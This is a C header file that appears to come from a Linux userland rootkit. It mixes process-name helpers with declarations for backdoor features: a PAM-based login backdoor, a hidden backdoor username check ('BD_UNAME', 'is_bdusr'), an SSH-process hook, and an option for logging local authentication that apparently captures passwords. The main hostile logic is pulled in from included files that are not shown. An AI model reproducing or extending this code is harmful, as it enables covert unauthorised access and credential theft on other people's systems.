#ifndef UTIL_H
#define UTIL_H

#define NAME_MAXLEN     128     /* max lengths for storing process name */
#define CMDLINE_MAXLEN  512     /* & cmdline string. */

#define PID_MAXLEN      10      /* +10 for those longer pids */
#define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN

#define MODE_NAME     0x01   /* defined modes for determining whether */
#define MODE_CMDLINE  0x02   /* to get just the process name or its full */
                             /* cmdline entry. */

void fallbackme(char **dest);
char *get_cmdline(pid_t pid);
int open_cmdline(pid_t pid);

char *process_info(pid_t pid, int mode);
/* macros for the use of process_info() for calling processes. */
#define process_name() process_info(getpid(), MODE_NAME)
#define process_cmdline() process_info(getpid(), MODE_CMDLINE)

int cmp_process(char *name);
char *str_process(char *name);
int process(char *name);
#ifdef USE_PAM_BD
int bd_sshproc(void);
#endif
#include "processes.c"

#define isbduname(name) !strncmp(name, BD_UNAME, strlen(BD_UNAME))

/* if PAM is being used... */
#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)

int verify_pass(char *user, char *acc_pass);
#include "verify_pass.c"

char *get_username(const pam_handle_t *pamh){
    void *u = NULL;
    if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS)
        return NULL;
    return (char *)u;
}

/* these macro functions were taken from one of PAM's headers.
 * we didn't need the full header, only these two functions.
 * i forget which header they're from originally. */
#define _pam_overwrite(x)      \
do{                            \
    register char *__xx__;     \
    if((__xx__=(x)))           \
        while(*__xx__)         \
            *__xx__++ = '\0';  \
}while(0)

#define _pam_drop(X)           \
do{                            \
    if(X){                     \
        free(X);               \
        X = NULL;              \
    }                          \
}while(0)

#endif

int not_user(int id){
    if(getuid() != id && geteuid() != id)
        return 1;
    return 0;
}

void unset_bad_vars(void);
int is_bdusr(void);
#include "bdusr.c"

#endif